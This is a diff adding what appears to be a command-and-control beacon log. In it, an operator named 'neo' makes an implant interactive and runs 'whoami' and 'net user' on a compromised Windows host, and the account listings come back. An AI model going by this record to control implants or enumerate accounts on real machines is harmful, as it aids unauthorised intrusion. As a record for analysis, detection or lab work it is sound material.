@@ -1,0 +1,28 @@
+09/04 14:01:34 UTC [metadata] unknown <- 192.168.1.15; computer: NOT-FOUND-404; user: kaeiy; process: beacon_x64.exe; pid: 23272; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+09/04 14:01:31 UTC [checkin] host called home, sent: 8 bytes
+09/04 14:02:13 UTC [input] <neo> sleep 0
+09/04 14:02:13 UTC [task] <T1029> Tasked beacon to become interactive
+09/04 14:02:31 UTC [checkin] host called home, sent: 16 bytes
+09/04 14:02:35 UTC [input] <neo> shell whoami
+09/04 14:02:35 UTC [task] <T1059> Tasked beacon to run: whoami
+09/04 14:02:35 UTC [checkin] host called home, sent: 37 bytes
+09/04 14:02:35 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+09/04 14:02:38 UTC [input] <neo> shell net user
+09/04 14:02:38 UTC [task] <T1059> Tasked beacon to run: net user
+09/04 14:02:38 UTC [checkin] host called home, sent: 39 bytes
+09/04 14:02:38 UTC [output]
+received output:
+
+\\NOT-FOUND-404 的用户帐户
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+kaeiy                    WDAGUtilityAccount       
+命令成功完成。
+
+
+
